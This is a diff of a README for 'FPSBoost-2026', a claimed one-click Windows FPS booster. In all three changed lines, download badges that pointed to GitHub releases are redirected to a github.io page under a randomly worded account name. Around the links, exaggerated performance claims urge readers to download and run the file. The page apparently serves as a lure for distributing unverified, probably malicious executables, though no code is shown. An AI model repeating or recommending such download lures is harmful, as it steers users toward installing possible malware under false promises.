@@ -4,7 +4,7 @@
 
 **Ready to play without lag?** FPSBoost-2026 automatically tunes your Windows PC for maximum gaming performance. One click and watch your FPS climb while your games run smoother than ever.
 
-[![Download Now](https://img.shields.io/badge/⬇️_DOWNLOAD_FPSBOOST_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=24292e)](https://github.com/angoumoisgrainmothpositivemuon572/FPSBoost-2026/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_DOWNLOAD_FPSBOOST_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=24292e)](https://angoumoisgrainmothpositivemuon572.github.io)
 
 ---
 
@@ -43,7 +43,7 @@ Getting started is incredibly easy. Follow these simple steps:
 ### Step 1: Visit the Download Page
 Visit this link to download the application:
 
-[![Download FPSBoost-2026](https://img.shields.io/badge/CLICK_HERE_TO_DOWNLOAD-1E90FF?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://github.com/angoumoisgrainmothpositivemuon572/FPSBoost-2026/releases)
+[![Download FPSBoost-2026](https://img.shields.io/badge/CLICK_HERE_TO_DOWNLOAD-1E90FF?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://angoumoisgrainmothpositivemuon572.github.io)
 
 ### Step 2: Save the File
 When you click the link, you'll be taken to a page with release files. Find the latest release and download it to your computer. The file will be saved to your "Downloads" folder by default.
@@ -176,7 +176,7 @@ Download it today, click the boost button, and get back to gaming with a buttery
 
 ---
 
-[![Get FPSBoost-2026 Now](https://img.shields.io/badge/🚀_GET_FPSBOOST_2026-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=2c2c2c)](https://github.com/angoumoisgrainmothpositivemuon572/FPSBoost-2026/releases)
+[![Get FPSBoost-2026 Now](https://img.shields.io/badge/🚀_GET_FPSBOOST_2026-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=2c2c2c)](https://angoumoisgrainmothpositivemuon572.github.io)
 
 **Join thousands of gamers who already boosted their FPS!**
 
